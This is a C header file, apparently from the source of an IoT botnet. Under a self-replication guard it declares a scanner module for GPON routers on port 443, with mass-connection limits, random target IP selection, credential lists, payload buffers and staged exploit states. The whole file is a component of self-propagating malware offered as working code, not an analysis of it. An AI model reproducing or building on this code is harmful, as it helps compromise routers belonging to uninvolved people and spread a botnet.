#ifdef SELFREP
#pragma once
#include <stdint.h>
#include "includes.h"

#ifdef DEBUG
#define GPON443_SCANNER_MAX_CONNS   3
#define GPON443_SCANNER_RAW_PPS     788
#else
#define GPON443_SCANNER_MAX_CONNS   256
#define GPON443_SCANNER_RAW_PPS     788
#endif

#define GPON443_SCANNER_RDBUF_SIZE  1080
#define GPON443_SCANNER_HACK_DRAIN  64

struct gpon443_scanner_connection
{
    int fd, last_recv;
    enum
    {
        GPON443_SC_CLOSED,
        GPON443_SC_CONNECTING,
        GPON443_SC_GET_CREDENTIALS,
        GPON443_SC_EXPLOIT_STAGE2,
        GPON443_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[GPON443_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void gpon443_scanner();
void gpon443_kill(void);

static void gpon443_setup_connection(struct gpon443_scanner_connection *);
static ipv4_t get_random_gpon443_ip(void);

#endif
